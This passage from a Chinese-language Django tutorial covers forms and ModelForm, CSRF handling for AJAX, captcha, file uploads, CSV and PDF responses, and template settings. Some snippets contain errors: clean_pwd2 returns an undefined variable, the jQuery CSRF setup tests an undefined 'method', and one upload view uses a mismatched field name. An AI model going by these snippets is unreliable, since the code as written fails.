        if User.objects.filter(username = user).exists(): raise forms.ValidationError('用户名已存在!')
        return user

    def clean(self):
        cleaned_data = self.cleaned_data
        # cleaned_data = super().clean()
        pwd = cleaned_data['pwd']
        pwd2 = cleaned_data['pwd2']
        if pwd != pwd2: raise forms.ValidationError('二次输入密码不匹配')
        return cleaned_data  #注意此处一定要return clean_data,否则会报错

    # 或者
    def clean_pwd2(self):
        if self.cleaned_data['pwd'] != self.cleaned_data['pwd2']: raise forms.ValidationError('两次密码不一致')
        return pwd2

def login(request):
    if request.POST:
        objPost = LoginForm(request.POST)
        if objPost.is_valid():
            print(objPost.clean())
        else:
            from django.forms.utils import ErrorDict
            print(objPost.non_field_errors())
            pass
        return render(request, 'login.html', {'obj1': objPost})
    else:
        objGet = LoginForm()
        return render(request, 'login.html', {'obj1': objGet})

</textarea>

<h4>模型表单ModelForm </h4><pre>
如果正在构建一个数据库驱动的应用,那么可能会有与Django的模型紧密映射的表单。比如有个BlogComment模型,并且还想创建一个表单让大家提交评论到这个模型中。在这种情况下写一个forms.Form类,然后在表单类中定义字段,这种一般创建表单的做法是冗余的,因为已经在ORM模型model中定义了字段的属性和功能,完全没必要重新写一遍字段,Django提供一个辅助类利用Django的ORM模型model创建Form

</pre><textarea>
# myapp/forms.py
from django.forms import ModelForm # 首先从django.forms导入ModelForm
from myapp.models import Article

# 创建表单类,编写一个继承ModelForm的类
class ArticleForm(ModelForm):
    # 在新类里设置元类Meta
    class Meta:
        model = Article  # 设置model属性为要关联的ORM模型
        fields = ['pub_date', 'headline', 'content', 'reporter'] # 设置fields属性为要在表单中使用的字段列表,列表里的值应该是ORM模型model中的字段名

# myapp/views.py
# 创建一个表单,用于添加文章
form = ArticleForm()

# 创建表单修改已有的文章
article = Article.objects.get(pk=1)
form = ArticleForm(instance=article)

</textarea><pre>
model和form比较简单时,字段数量少,看不出这么做的威力和效率。但如果是大型项目,每个模型的字段数量几十上百,这么做的收益将非常巨大,而且后面还有一招提高效率的大杀器,也就是一步保存数据的操作。

字段类型
生成的Form类中将具有和指定的模型字段对应的表单字段,顺序为fields属性列表中指定的顺序。
每个模型字段有一个对应的默认表单字段,比如模型中的CharField表现成表单中的CharField。模型中的ManyToManyField字段会表现成MultipleChoiceField字段

模型字段和表单字段完整的映射列表:Django在设计model字段和表单字段时存在大量的相似和重复之处
AutoField   在Form类中无法使用
BigAutoField    在Form类中无法使用
BigIntegerField IntegerField,最小-9223372036854775808,最大9223372036854775807.
BooleanField    BooleanField
CharField   CharField,同样的最大长度限制。如果model设置了null=True,Form将使用empty_value
CommaSeparatedIntegerField  CharField
DateField   DateField
DateTimeField   DateTimeField
DecimalField    DecimalField
EmailField  EmailField
FileField   FileField
FilePathField   FilePathField
FloatField  FloatField
ForeignKey  ModelChoiceField
ImageField  ImageField
IntegerField    IntegerField
IPAddressField  IPAddressField
GenericIPAddressField   GenericIPAddressField
ManyToManyField ModelMultipleChoiceField
NullBooleanField    NullBooleanField
PositiveIntegerField    IntegerField
PositiveSmallIntegerField   IntegerField
SlugField   SlugField
SmallIntegerField   IntegerField
TextField   CharField,并带有widget=forms.Textarea参数
TimeField   TimeField
URLField    URLField

ManyToManyField和ForeignKey字段类型属于特殊情况:
ForeignKey被映射成为表单类的django.forms.ModelChoiceField,它的选项是一个模型的QuerySet,即可选择的对象的列表,但是只能选择一个。
ManyToManyField被映射成为表单类的django.forms.ModelMultipleChoiceField,它的选项也是一个模型的QuerySet,即可选择的对象的列表,但可同时选择多个

同时在表单属性设置上还有下面的映射关系:
如果模型字段设置blank=True,那么表单字段的required设置为False,否则required=True。
表单字段的label属性根据模型字段的verbose_name属性设置,并将第一个字母大写。
如果模型的某个字段设置了editable=False属性,那么它表单类中将不会出现该字段,都不能编辑了,还放在表单里提交什么？
表单字段的help_text设置为模型字段的help_text。
如果模型字段设置了choices参数,那么表单字段的widget属性将设置成Select框,其选项来自模型字段的choices。选单中通常会包含一个空选项且作为默认选择。如果该字段是必选的,它会强制用户选择一个选项。 如果模型字段具有default参数,则不会添加空选项到选单中。

FileField
class FileField(**kwargs)
Default widget: ClearableFileInput
Empty value: None
Normalizes to: An UploadedFile object that wraps the file content and file name into a single object.
Can validate that non-empty file data has been bound to the form.
Error message keys: required, invalid, missing, empty, max_length

Has two optional arguments for validation, max_length and allow_empty_file. If provided, these ensure that the file name is at most the given length, and that validation will succeed even if the file content is empty.

When you use a FileField in a form, you must also remember to bind the file data to the form.

The max_length error refers to the length of the filename. In the error message for that key, %(max)d will be replaced with the maximum filename length and %(length)d will be replaced with the current filename length

</pre><textarea>
from django.db import models
from django.forms import ModelForm

TITLE_CHOICES = (
    ('MR', 'Mr.'),
    ('MRS', 'Mrs.'),
    ('MS', 'Ms.'),
)

class Author(models.Model):
    name = models.CharField(max_length=100)
    title = models.CharField(max_length=3, choices=TITLE_CHOICES)
    birth_date = models.DateField(blank=True, null=True)

    def __str__(self):              # __unicode__ on Python 2
        return self.name

class Book(models.Model):
    name = models.CharField(max_length=100)
    authors = models.ManyToManyField(Author)

class AuthorForm(ModelForm):
    class Meta:
        model = Author
        fields = ['name', 'title', 'birth_date']

class BookForm(ModelForm):
    class Meta:
        model = Book
        fields = ['name', 'authors']

# 上面的ModelForm子类基本等同于下面的定义方式(唯一的区别是save()方法):
from django import forms
class AuthorForm(forms.Form):
    name = forms.CharField(max_length=100)
    title = forms.CharField(max_length=3, widget=forms.Select(choices=TITLE_CHOICES))
    birth_date = forms.DateField(required=False)

class BookForm(forms.Form):
    name = forms.CharField(max_length=100)
    authors = forms.ModelMultipleChoiceField(queryset=Author.objects.all())

</textarea><pre>
提供初始值
可以在实例化一个表单时通过指定initial参数来提供表单中数据的初始值。

article = Article.objects.get(pk=1)
article.headline  # 'My headline'
form = ArticleForm(initial={'headline': 'Initial headline'}, instance=article)
form['headline'].value()  # 'Initial headline'

ModelForm的验证
验证ModelForm主要分两步:
验证表单
验证模型实例

与普通的表单验证类似,模型表单的验证也是调用is_valid()方法或访问errors属性。模型的验证(Model.full_clean())紧跟在表单的clean()方法调用之后。通常使用Django内置的验证器就好了。如果需要可以重写模型表单的clean()来提供额外的验证,方法和普通的表单一样。

ModelForm的字段选择
建议使用ModelForm的fields属性,在赋值的列表内一个一个将要使用的字段添加进去,这样安全可靠。
然而有时候字段太多,或想偷懒不愿意一个一个输入,也有简单的方法:

__all__:
将fields属性的值设为__all__表示将映射的模型中的全部字段都添加到表单类中来。

exclude属性:
表示将model中除了exclude属性中列出的字段之外的所有字段,添加到表单类中作为表单字段。

</pre><textarea>
from django.forms import ModelForm
class AuthorForm(ModelForm):
    class Meta:
        model = Author
        fields = '__all__'

class PartialAuthorForm(ModelForm):
    class Meta:
        model = Author
        exclude = ['title']  # 因为Author模型有3个字段name、birth_date和title,这个例子会让birth_date和name出现在表单中

</textarea><pre>
自定义ModelForm字段
有时候可能从模型到模型表单在字段上的映射关系不是想要的,或想进行一些更加灵活的定制,这时可使用Meta类内部的widgets属性
widgets属性接收一个数据字典,其中每个元素的键必须是模型中的字段名之一,键值就是要自定义的内容

print([e for e in dir(django.forms) if not e.startswith('_')])
['ALL_FIELDS', 'BaseForm', 'BaseFormSet', 'BaseInlineFormSet', 'BaseModelForm', 'BaseModelFormSet', 'BooleanField', 'BoundField', 'CharField', 'CheckboxInput', 'CheckboxSelectMultiple', 'ChoiceField', 'ClearableFileInput', 'ComboField', 'DateField', 'DateInput', 'DateTimeField', 'DateTimeInput', 'DecimalField', 'DurationField', 'EmailField', 'EmailInput', 'Field', 'FileField', 'FileInput', 'FilePathField', 'FloatField', 'Form', 'GenericIPAddressField', 'HiddenInput', 'ImageField', 'IntegerField', 'Media', 'MediaDefiningClass', 'ModelChoiceField', 'ModelForm', 'ModelMultipleChoiceField', 'MultiValueField', 'MultiWidget', 'MultipleChoiceField', 'MultipleHiddenInput', 'NullBooleanField', 'NullBooleanSelect', 'NumberInput', 'PasswordInput', 'RadioSelect', 'RegexField', 'Select', 'SelectDateWidget', 'SelectMultiple', 'SlugField', 'SplitDateTimeField', 'SplitDateTimeWidget', 'SplitHiddenDateTimeWidget', 'TextInput', 'Textarea', 'TimeField', 'TimeInput', 'TypedChoiceField', 'TypedMultipleChoiceField', 'URLField', 'URLInput', 'UUIDField', 'ValidationError', 'Widget', 'all_valid', 'boundfield', 'fields', 'fields_for_model', 'forms', 'formset_factory', 'formsets', 'inlineformset_factory', 'model_to_dict', 'modelform_factory', 'modelformset_factory', 'models', 'renderers', 'utils', 'widgets']

</pre><textarea>
# 想要让Author模型中的name字段的类型从CharField更改为textarea,而不是默认的< input type="text">,可以如下重写字段的Widget:
from django.utils.translation import ugettext_lazy as _
from django.forms import ModelForm, Textarea
from myapp.models import Author

class AuthorForm(ModelForm):
    class Meta:
        model = Author
        fields = ('name', 'title', 'birth_date')
        widgets = {
            'name': Textarea(attrs={'cols': 80, 'rows': 20}),  # 添加样式参数
        }
        # 指定Meta类内部的error_messages、help_texts和labels属性
        labels = {
            'name': _('Writer'),
        }
        help_texts = {
            'name': _('Some useful help text.'),
        }
        error_messages = {
            'name': {
                'max_length': _("This writer's name is too long."),
            },
        }
        # 还可以指定field_classes属性将字段类型设置为自己写的表单字段类型,例如为slug字段使用MySlugFormField
        field_classes = {
            'slug': MySlugFormField,
        }
        # 启用字段本地化:默认ModelForm中的字段不会本地化它们的数据,可以使用Meta类的localized_fields属性来启用字段的本地化功能,设置为__all__则表示所有的字段都将本地化
        localized_fields = ('birth_date',)

# 如果想完全控制一个字段,包括它的类型,验证器,是否必填等,可以显式地声明或指定这些性质,就像在普通表单中一样。比如要指定某个字段的验证器,可以显式定义字段并设置它的validators参数:
from django.forms import ModelForm, CharField
from myapp.models import Article

class ArticleForm(ModelForm):
    slug = CharField(validators=[validate_slug])

    class Meta:
        model = Article
        fields = ['pub_date', 'headline', 'content', 'reporter', 'slug']

</textarea><pre>
表单的继承
ModelForms是可以被继承的,子模型表单可以添加额外的方法和属性

</pre><textarea>
# 创建一个ArticleForm的子类EnhancedArticleForm,并增加一个clean_pub_date方法
class EnhancedArticleForm(ArticleForm):
    def clean_pub_date(self):
        ...

# 还可以修改Meta.fields或Meta.exclude列表,只要继承父类的Meta类
class RestrictedArticleForm(EnhancedArticleForm):
    class Meta(ArticleForm.Meta):
        exclude = ('body',)

</textarea>

<h4>CSRF与AJAX</h4><pre>
CSRF(Cross-site request forgery)跨站请求伪造,是一种常见的网络攻击手段,Django提供了防范CSRF攻击的机制。
默认情况下使用django-admin startproject xxx命令创建工程时CSRF防御机制就已经开启了,如果没有开启请在MIDDLEWARE设置中添加'django.middleware.csrf.CsrfViewMiddleware'。

对于GET请求一般没有这个问题,CSRF通常是针对POST方法的
在含有POST表单的模板中,需要在其form表单元素内部添加csrf_token标签,如下所示:

< form action="" method="post">
    {% csrf_token %}
    ....
< /form>

这样当表单数据通过POST方法发送到后台服务器的时候,除了正常的表单数据外还会携带一个CSRF令牌随机字符串用于进行csrf验证,如果表单中没有携带这个csrf令牌将会获得一枚403奖章。

【 AJAX的CSRF 】
前端AJAX是"Asynchronous Javascript And XML"(异步js和XML),经常被用来在不刷新页面的情况下提交和请求数据。如果Django服务器接收的是一个通过AJAX发送过来的POST请求的话,那么将很麻烦,因为AJAX中没有办法像form表单中那样携带{% csrf_token %}令牌。
解决办法是在前端模版的Js代码处,添加下面的代码,让ajax的POST方法带上CSRF需要的令牌,它依赖Jquery库,必须提前加载Jquery,这是Django官方提供的解决方案

</pre><textarea>
// using jQuery
function getCookie(name) {
    var cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        var cookies = document.cookie.split(';');
        for (var i = 0; i < cookies.length; i++) {
            var cookie = jQuery.trim(cookies[i]);
            if (cookie.substring(0, name.length + 1) === (name + '=')) {
                cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                break;
            }
        }
    }
    return cookieValue;
}

$.ajaxSetup({
    beforeSend: function(xhr, settings) {
        if (!(/^(GET|HEAD|OPTIONS|TRACE)$/.test(method)) && !this.crossDomain) { // 这些HTTP方法不要求CSRF包含
            xhr.setRequestHeader("X-CSRFToken", getCookie('csrftoken'));
        }
    }
});

</textarea><pre>
【 装饰器 】
1. 单独指定csrf验证需要
有时在全站上关闭了CSRF功能,但希望某些视图还有CSRF防御,Django提供了一个csrf_protect(view)装饰器

</pre>现在虽然全站关掉了csrf,但是my_view视图依然需要进行csrf验证<textarea>
from django.views.decorators.csrf import csrf_protect
from django.shortcuts import render

@csrf_protect
def my_view(request):
    c = {}
    # ...
    return render(request, "a_template.html", c)

</textarea><pre>
2. 单独指定忽略csrf验证
在全站开启CSRF机制时有些视图并不想开启这个功能。比如有另外一台机器通过requests库模拟HTTP通信以POST请求向Django主机服务器发送过来了一段保密数据,它无法携带CSRF令牌,必然会被403。在接收这个POST请求的视图上为CSRF开道口子,不进行验证。这就需要使用Django提供的csrf_exempt(view)装饰器

</pre>这下POST数据是没问题了,但是又带来了新的安全问题,需要自己处理<textarea>
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpResponse

@csrf_exempt
def my_view(request):
    return HttpResponse('Hello world')

</textarea><pre>
3. 确保csrf令牌被设置
Django还提供了一个装饰器,确保被装饰的视图在返回页面时同时将csrf令牌一起返回,这个装饰器是:ensure_csrf_cookie(view),其使用方法和上面的一样:

</pre><textarea>
from django.views.decorators.csrf import ensure_csrf_cookie
from django.http import HttpResponse

@ensure_csrf_cookie
def my_view(request):
    return HttpResponse('Hello world')

</textarea><pre>
4. requires_csrf_token(view)
这个装饰器类似csrf_protect,一样要进行csrf验证,但是它不会拒绝发送过来的请求。

</pre><textarea>
from django.views.decorators.csrf import requires_csrf_token
from django.shortcuts import render

@requires_csrf_token
def my_view(request):
    c = {}
    # ...
    return render(request, "a_template.html", c)

</textarea>

<h4>图片验证码 django-simple-captcha</h4><pre>
为了防止机器人频繁登录网站或者破坏分子恶意登录,很多用户登录和注册系统都提供了图形验证码功能。
验证码(CAPTCHA)是"Completely Automated Public Turing test to tell Computers and Humans Apart"(全自动区分计算机和人类的图灵测试)的缩写,是一种区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水,有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试。
图形验证码的历史比较悠久,到现在已经有点英雄末路的味道了。因为机器学习、图像识别的存在,机器人已经可以比较正确的识别图像内的字符了。但不管怎么说,作为一种防御手段,至少还是可以抵挡一些低级入门的攻击手段,抬高了攻击者的门槛。
在Django中实现图片验证码功能非常简单,可以使用现成的第三方库django-simple-captcha

pip3 install django-simple-captcha
pip自动安装了相关的依赖库six、olefile和Pillow,其中的Pillow是大名鼎鼎的绘图模块

【 注册captcha 】
在settings的INSTALLED_APPS中将'captcha'注册到app列表里:
captcha需要在数据库中建立自己的数据表,所以需要执行migrate命令生成数据表:
python3 manage.py migrate

【 添加url路由 】
在根目录下的urls.py文件中增加captcha对应的url,由于使用了二级路由机制,需要在顶部from django.urls import include

from django.contrib import admin
from django.urls import path
from django.urls import include
from login import views
urlpatterns = [
    path('admin/', admin.site.urls),
    path('index/', views.index),
    path('login/', views.login),
    path('register/', views.register),
    path('logout/', views.logout),
    path('captcha/', include('captcha.urls'))
]

【 修改forms.py 】
在forms.py文件中添加CaptchaField

from django import forms
from captcha.fields import CaptchaField
class UserForm(forms.Form):
    username = forms.CharField(label="用户名", max_length=128, widget=forms.TextInput(attrs={'class': 'form-control', 'placeholder': "Username",'autofocus': ''}))
    password = forms.CharField(label="密码", max_length=256, widget=forms.PasswordInput(attrs={'class': 'form-control',  'placeholder': "Password"}))
    captcha = CaptchaField(label='验证码')

【 修改模板login.html 】

</pre><textarea>
< form class="form-login" action="/login/" method="post">
    {% if login_form.captcha.errors %}
        < div class="alert alert-warning">{{ login_form.captcha.errors }}< /div>
    {% elif message %}
        < div class="alert alert-warning">{{ message }}< /div>
    {% endif %}

    {% csrf_token %}
    < h3 class="text-center">欢迎登录< /h3>

    < div class="form-group">
    {{ login_form.username.label_tag }}
    {{ login_form.username}}
    < /div>

    < div class="form-group">
    {{ login_form.password.label_tag }}
    {{ login_form.password }}
    < /div>

    < div class="form-group">
    {{ login_form.captcha.label_tag }}
    {{ login_form.captcha }}
    < /div>

    < div>
        < a href="/register/" class="text-success " >< ins>新用户注册< /ins>< /a>
        < button type="submit" class="btn btn-primary float-right">登录< /button>
    < /div>
< /form>

</textarea><pre>
验证图形码是否正确的工作都是在后台自动完成的,只需要使用is_valid()这个forms内置的验证方法就一起进行了,不需要在视图函数中添加任何的验证代码
还可以设置六位、八位验证码,可以对图形噪点的生成模式等进行定制

</pre>
</div>

<div id="django_upload">
<h4>文件上传</h4><pre>
Django在处理文件上传时文件数据被打包封装在request.FILES中
request.FILES只有在请求方法为POST,且提交请求的form具有enctype="multipart/form-data"属性时才有效,否则request.FILES将为空

setting.py设置
MEDIA_ROOT = os.path.join(BASE_DIR, 'media').replace("\\", "/")
MEDIA_URL = '/media/'

一、简单上传

</pre><textarea>
### 首先写一个必须包含一个FileField的form模型
# forms.py
from django import forms
class UploadFileForm(forms.Form):
    title = forms.CharField(max_length=50)
    file = forms.FileField()

# 处理这个表单的视图将在request.FILES中收到文件数据,可用request.FILES['file']来获取上传文件的具体数据,其中的键值'file'是根据file = forms.FileField()的变量名来的。

### 下面是一个接收上传文件的视图范例
# views.py
from django.http import HttpResponseRedirect
from django.shortcuts import render
from .forms import UploadFileForm
from somewhere import handle_uploaded_file  # 另外写一个处理上传过来的文件的方法,并在这里导入

def upload_file(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES) # 注意获取数据的方式,必须将request.FILES传递到form的构造函数中
        if form.is_valid():
            handle_uploaded_file(request.FILES['file'])
            return HttpResponseRedirect('/success/url/')
    else:
        form = UploadFileForm()
    return render(request, 'upload.html', {'form': form})

# 下面是一个处理上传文件的方法的参考例子:
def handle_uploaded_file(f):
    target = 'some/file/name.txt' # target为'name.txt'时文件将上传至项目根目录,需要设置MEDIA_ROOT配置项
    with open(target, 'wb+') as destination:
        for chunk in f.chunks():     # 遍历UploadedFile.chunks(),而不是直接使用read()方法,能确保大文件不会占用系统过多的内存
            destination.write(chunk)

</textarea><pre>
二、 使用模型处理上传的文件
如果通过模型层的model来指定上传文件的保存方式则使用ModelForm更方便。 调用form.save()时文件对象会保存在相应的FileField的upload_to参数指定的地方。

</pre><textarea>
# models.py
class ModelWithFileField(models.Model):
    title = models.CharField(max_length=50)
    file = models.FileField(upload_to='uploads/%Y_%m_%d/')

# forms.py
from django.forms import ModelForm
from .models import ModelWithFileField
class ModelFormWithFileField(ModelForm):
    class Meta:
        model = ModelWithFileField
        fields = ['title', 'file']

# view.py
from django.http import HttpResponseRedirect
from django.shortcuts import render
from .forms import ModelFormWithFileField

def upload(request):
    if request.method == 'POST':
        form = ModelFormWithFileField(request.POST, request.FILES)
        if form.is_valid():
            form.save()  # 这么做就可以了,文件会被保存到Model中upload_to参数指定的位置
            return HttpResponseRedirect('/polls/')
    else:
        form = ModelFormWithFileField()
        print("GET", form)
    return render(request, 'polls/test.html', {'form': form})

</textarea>如果手动构造一个对象,还可以简单地把文件对象直接从request.FILES赋值给模型<textarea>
from django.http import HttpResponseRedirect
from django.shortcuts import render
from .forms import UploadFileForm
from .models import ModelWithFileField

def upload_file(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)
        if form.is_valid():
            instance = ModelWithFileField(file_field=request.FILES['file'])
            instance.save()
            return HttpResponseRedirect('/success/url/')
    else:
        form = UploadFileForm()
    return render(request, 'upload.html', {'form': form})

</textarea><pre>
三、 同时上传多个文件
使用一个表单字段同时上传多个文件需要设置字段HTML标签的multiple属性为True

</pre><textarea>
{% if form.is_multipart %}
    <form enctype="multipart/form-data" method="post" action="/foo/">
{% else %}
    <form method="post" action="/foo/">
{% endif %}
{{ form }}
</form>

</textarea><textarea>
# forms.py
from django import forms
class FileFieldForm(forms.Form):
    file_field = forms.FileField(widget=forms.ClearableFileInput(attrs={'multiple': True}))

### 然后自己编写一个FormView的子类,并覆盖它的post方法来处理多个文件上传:
# views.py
from django.views.generic.edit import FormView
from .forms import FileFieldForm

class FileFieldView(FormView):
    form_class = FileFieldForm
    template_name = 'upload.html'  # 模版名
    success_url = '...'            # 用的URL或reverse()替换

    def post(self, request, *args, **kwargs):
        form_class = self.get_form_class()
        form = self.get_form(form_class)
        files = request.FILES.getlist('file_field')
        if form.is_valid():
            for f in files:
                ...  # Do something with each file.
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

</textarea><pre>
四、上传文件处理器
用户上传一个文件时Django会把文件数据传递给上传文件处理器–一个类。

上传处理器的配置定义在FILE_UPLOAD_HANDLERS中,默认为:
["django.core.files.uploadhandler.MemoryFileUploadHandler", "django.core.files.uploadhandler.TemporaryFileUploadHandler"]
MemoryFileUploadHandler和TemporaryFileUploadHandler定义了Django的默认文件上传行为:将小文件读取到内存中,大文件放置在磁盘中。

在保存上传文件之前,数据需要储存在某个地方。通常如果上传文件小于2.5MB,Django会把整个内容存到内存。 这意味着,文件的保存仅仅涉及到内存中的读取和磁盘的写入,所以非常快。但如果上传的文件很大,Django会把它写入一个临时文件,储存在系统临时目录中。在类Unix的平台下Django会生成一个文件,名称类似于/tmp/tmpzfp6I6.upload。

可以编写自定义的处理器来定制Django如何处理文件。例如根据级别不同限制用户的磁盘配额,在运行中压缩数据,渲染进度条,甚至是转存到另一个储存位置,而不把它存到本地。

</pre>
</div>

<div id="django_csv_pdf">
<h4>动态生成CSV文件</h4><pre>
CSV (Comma Separated Values)以纯文本形式存储数字和文本数据的存储方式。纯文本意味着该文件是一个字符序列,不含必须像二进制数字那样的数据。CSV文件由任意数目的记录组成,记录间以某种换行符分隔;每条记录由字段组成,字段间的分隔符是其它字符或字符串,最常见的是逗号或制表符。通常所有记录都有完全相同的字段序列。
要在Django的视图中生成CSV文件,可以使用Python的CSV库或Django的模板系统来实现。

一、使用Python的CSV库
Python自带处理CSV文件的标准库csv。csv模块的CSV文件创建功能作用于类似于文件对象创建,并且Django的HttpResponse对象也是类似于文件的对象

</pre><textarea>
import csv
from django.http import HttpResponse

def some_view(request):
    # Create the HttpResponse object with the appropriate CSV header.
    # 响应对象的MIME类型设置为text/csv,告诉浏览器返回一个CSV文件而不是HTML文件
    response = HttpResponse(content_type='text/csv')
    # 响应对象设置了附加的Content-Disposition协议头,含有CSV文件的名称。文件名随便取,浏览器会在"另存为..."对话框等环境中使用它
    response['Content-Disposition'] = 'attachment; filename="somefilename.csv"'
    # 要在生成CSV的API中使用钩子非常简单:只需要把response作为第一个参数传递给csv.writer。csv.writer方法接受一个类似于文件的对象如HttpResponse对象
    writer = csv.writer(response)
    # 对于CSV文件的每一行,调用writer.writerow,向它传递一个可迭代的对象比如列表或元组
    # CSV模板会处理各种引用,不用担心没有转义字符串中的引号或逗号。只需要向writerow()传递原始字符串,它就会执行正确的操作。
    writer.writerow(['First row', 'Foo', 'Bar', 'Baz'])
    writer.writerow(['Second row', 'A', 'B', 'C', '"Testing"', "Here's a quote"])
    return response

</textarea>当处理大尺寸文件时,可以使用Django的StreamingHttpResponse类,通过流式传输,避免负载均衡器在服务器生成响应的时候断掉连接,提高传输可靠性,下面的例子利用Python的生成器来有效处理大尺寸CSV文件的拼接和传输<textarea>
import csv
from django.http import StreamingHttpResponse

class Echo(object):
    """An object that implements just the write method of the file-like interface"""
    def write(self, value):
        """Write the value by returning it, instead of storing in a buffer."""
        return value

def some_streaming_csv_view(request):
    """A view that streams a large CSV file."""
    # Generate a sequence of rows. The range is based on the maximum number of rows that can be handled by a single sheet in most spreadsheet applications.
    rows = (["Row {}".format(idx), str(idx)] for idx in range(65536))
    pseudo_buffer = Echo()
    writer = csv.writer(pseudo_buffer)
    response = StreamingHttpResponse((writer.writerow(row) for row in rows), content_type="text/csv")
    response['Content-Disposition'] = 'attachment; filename="somefilename.csv"'
    return response

</textarea><pre>
二、使用Django的模板系统
也可以使用Django的模板系统来生成CSV。比起便捷的Python-csv库,这样做比较低级,不建议这么做,这里只是展示一下有这种方式而已。
思路: 传递一个项目的列表给模板,并且让模板在for循环中输出逗号

</pre>下面例子像上面一样生成相同的CSV文件<textarea>
from django.http import HttpResponse
from django.template import loader, Context

def some_view(request):
    # Create the HttpResponse object with the appropriate CSV header.
    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment; filename="somefilename.csv"'

    # The data is hard-coded here, but you could load it from a database or some other source.
    csv_data = (
        ('First row', 'Foo', 'Bar', 'Baz'),
        ('Second row', 'A', 'B', 'C', '"Testing"', "Here's a quote"),
    )

    t = loader.get_template('my_template_name.txt')
    c = Context({'data': csv_data})
    response.write(t.render(c))
    return response

# 然后创建模板my_template_name.txt,带有以下模板代码:
{% for row in data %}"{{ row.0|addslashes }}", "{{ row.1|addslashes }}", "{{ row.2|addslashes }}", "{{ row.3|addslashes }}", "{{ row.4|addslashes }}"
{% endfor %}

</textarea>

<h4>动态生成PDF文件</h4><pre>
可以通过开源的Python PDF库ReportLab来实现PDF文件的动态生成,ReportLab并不是线程安全的

一、安装ReportLab
ReportLab库在PyPI上提供,可以使用pip来安装:
$ pip install reportlab
在Python交互解释器中导入它来测试安装,如果没有抛出任何错误则证明已安装成功
>>> import reportlab

二、编写视图
ReportLab的API可以处理于类似于文件(file-like)的对象

</pre><textarea>
from reportlab.pdfgen import canvas
from django.http import HttpResponse

def some_view(request):
    # 创建带有PDF头部定义的HttpResponse对象,响应对象的MIME类型为application/pdf,这会告诉浏览器文档是个PDF文件而不是HTML文件
    response = HttpResponse(content_type='application/pdf')
    # 响应对象设置了附加的Content-Disposition协议头,含有PDF文件的名称,文件名可以是任意的,浏览器会在"另存为..."对话框等中使用,Content-Disposition以'attachment'开头,强制让浏览器弹出对话框来提示或确认
    response['Content-Disposition'] = 'attachment; filename="somefilename.pdf"'

    # 创建一个PDF对象,并使用响应对象作为它要处理的'文件',Canvas函数接受一个类似于文件的对象,而HttpResponse对象正好合适
    p = canvas.Canvas(response)

    # 通过PDF对象的drawString方法,写入一条信息
    p.drawString(100, 100, "Hello world.")

    # 关闭PDF对象
    p.showPage()
    p.save()
    return response

</textarea><pre>
三、复杂的PDF
使用ReportLab创建复杂的PDF文档时,可以考虑使用io库作为PDF文件的临时保存地点。这个库提供了一个类似于文件的对象接口,非常实用

</pre><textarea>
from io import BytesIO
from reportlab.pdfgen import canvas
from django.http import HttpResponse

def some_view(request):
    # Create the HttpResponse object with the appropriate PDF headers.
    response = HttpResponse(content_type='application/pdf')
    response['Content-Disposition'] = 'attachment; filename="somefilename.pdf"'

    buffer = BytesIO()

    # Create the PDF object, using the BytesIO object as its "file."
    p = canvas.Canvas(buffer)

    # Draw things on the PDF. Here's where the PDF generation happens.
    # See the ReportLab documentation for the full list of functionality.
    p.drawString(100, 100, "Hello world.")

    # Close the PDF object cleanly.
    p.showPage()
    p.save()

    # Get the value of the BytesIO buffer and write it to the response.
    pdf = buffer.getvalue()
    buffer.close()
    response.write(pdf)
    return response

</textarea>
</div>

<div id="django_template">
<h4>模板层</h4><pre>
每一个Web框架都需要一种便利的方法用于动态生成HTML页面,最常见的做法是使用模板,模板包含所需HTML页面的静态部分及一些特殊的模版语法,用于将动态内容插入静态部分。

模板层就是如何往HTML文件中填入动态内容的系统。
Django可以配置一个或多个模板引擎(语言),也可以不用引擎。
Django自带一个称为DTL(Django Template Language)的模板语言,以及另外一种流行的Jinja2语言(需要提前安装pip3 install Jinja2)。
内置的后端有django.template.backends.django.DjangoTemplates和django.template.backends.jinja2.Jinja2

Django为加载和渲染模板定义了一套标准的API,与具体的后台无关。加载指的是根据给定的模版名称找到的模板然后预处理,通常会将它编译好放在内存中。渲染则表示使用Context数据对模板插值并返回生成的字符串。

DTL作为Django原生的模板系统,一直到Django1.8都是唯一的内置模版系统,可能它有些不足,但仍然是一个优秀的模版库。如果没有特别重要的理由需要选择另外一种模版系统的话,建议坚持使用DTL,特别是在编写可插拔的应用并打算发布其模板的时候。Django很多内部组件都使用了DTL,例如django.contrib.admin

【 配置引擎 】
模板引擎通过settings中的TEMPLATES设置来配置。这是一个列表,与引擎一一对应,每个元素都是一个引擎配置字典
由startproject命令生成的settings.py会自定定义如下的值:

</pre><textarea>
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

</textarea><pre>
由于绝大多数引擎都是从文件加载模板的,所以每种模板引擎都包含两项通用设置:
1、DIRS:定义一个目录列表,模板引擎按列表顺序搜索这些目录以查找模板源文件。
2、APP_DIRS:告诉模板引擎是否应该进入每个已安装的应用中查找模板,通常将该选项保持为True。

每种模板引擎后端都定义了一个惯用的名称作为应用内部存放模板的子目录名称,Django为它自己的模板引擎指定的是'templates',为jinja2指定的名字是'jinja2'。尤其是django允许有多个模板引擎后端实例,且每个实例有不同的配置选项,在这种情况下必须为每个配置指定一个唯一的NAME

DTL引擎的OPTIONS配置项中接受以下参数:
'autoescape':用于控制是否启用HTML自动转义功能,默认True。
'context_processors': 以"."为分隔符的Python调用路径的列表,默认是个空列表。
'debug':打开/关闭模板调试模式的布尔值,默认和setting中的DEBUG有相同的值。
'loaders':模板加载器类的虚拟Python路径列表,默认值取决于DIRS和APP_DIRS的值。
'string_if_invalid':非法变量时输出的字符串,默认空字符串。
'file_charset':用于读取磁盘上的模板文件的字符集编码,默认为FILE_CHARSET的值。
'libraries':用于注册模板引擎,这可以用于添加新的库或为现有库添加备用标签。
